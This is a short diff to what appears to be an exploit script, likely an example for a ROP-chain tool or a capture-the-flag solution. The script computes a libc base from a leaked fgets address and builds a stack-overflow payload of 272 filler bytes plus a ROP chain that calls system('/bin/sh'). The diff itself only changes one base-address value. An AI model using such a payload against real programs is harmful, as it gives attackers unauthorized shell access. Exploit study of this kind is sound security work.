@@ -15,7 +15,7 @@ fgets_addr = int(p.readline().split(":")[1].strip(), 16)
 libc_address = fgets_addr - ELF(libc).symbols['fgets']
 
 goals = [ ["function", "system", "/bin/sh"] ]
-files = [(filename, None, 0), (libc, 'libc.gadgets', libc_address)]
+files = [(filename, None, None), (libc, 'libc.gadgets', libc_address)]
 rop = ropme.rop(files, [libc], goals, arch = archinfo.ArchX86(), log_level = logging.DEBUG)
 payload = 'A'*272 + rop
 
